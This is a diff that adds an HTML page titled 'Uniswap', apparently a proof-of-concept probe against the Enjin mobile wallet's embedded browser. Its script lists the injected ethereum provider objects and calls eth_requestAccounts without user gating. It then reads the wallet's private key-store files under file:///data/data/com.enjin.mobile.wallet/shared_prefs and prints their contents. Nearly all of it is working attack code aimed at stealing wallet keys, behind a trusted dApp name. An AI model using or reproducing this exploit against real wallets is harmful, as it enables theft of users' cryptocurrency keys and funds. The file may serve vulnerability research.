@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html><head>
+<title>Uniswap</title>
+<meta name="application-name" content="Uniswap">
+</head>
+<body style="font-family:monospace;font-size:14px;padding:8px;background:#fff;color:#000">
+<h2 id="hdr">ENJIN WEB3 PROBE</h2>
+<pre id="out">init...</pre>
+<script>
+function log(s){var o=document.getElementById('out');o.textContent+= "\n"+s;}
+function dump(){
+  try{
+    log("href="+location.href);
+    log("host="+location.host+" proto="+location.protocol);
+    log("window.ethereum="+(typeof window.ethereum));
+    log("window._ew_="+(typeof window._ew_));
+    log("window.enjin="+(typeof window.enjin));
+    log("window.web3="+(typeof window.web3));
+    if(window.ethereum){log("ethereum keys="+Object.keys(window.ethereum).join(","));}
+    if(window._ew_){log("_ew_ keys="+Object.keys(window._ew_).join(","));}
+  }catch(e){log("dump err="+e);}
+}
+function tryConnect(){
+  try{
+    if(window.ethereum&&window.ethereum.request){
+      window.ethereum.request({method:'eth_requestAccounts'}).then(function(a){
+        log("eth_requestAccounts OK="+JSON.stringify(a));
+      }).catch(function(e){log("eth_requestAccounts ERR="+e);});
+      log("eth_requestAccounts called (ungated test)");
+    } else { log("no ethereum.request"); }
+  }catch(e){log("connect err="+e);}
+}
+function readFile(p){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET',p,true);
+    x.onreadystatechange=function(){
+      if(x.readyState==4){
+        log("FILE "+p+" status="+x.status+" len="+(x.responseText?x.responseText.length:0));
+        if(x.responseText){log("BODY["+p+"]:\n"+x.responseText.substring(0,800));}
+      }
+    };
+    x.onerror=function(){log("FILE "+p+" XHR error");};
+    x.send();
+  }catch(e){log("readFile err "+p+"="+e);}
+}
+dump();
+// probe each call once page settles (allow provider injection)
+setTimeout(dump,1200);
+setTimeout(function(){
+  readFile('file:///data/data/com.enjin.mobile.wallet/shared_prefs/keys.xml');
+  readFile('file:///data/data/com.enjin.mobile.wallet/shared_prefs/wc_key_store.xml');
+  readFile('file:///data/data/com.enjin.mobile.wallet/shared_prefs/wc_keystore_key.xml');
+  readFile('file:///data/data/com.enjin.mobile.wallet/shared_prefs/db_key_store.xml');
+},1800);
+</script>
+</body></html>
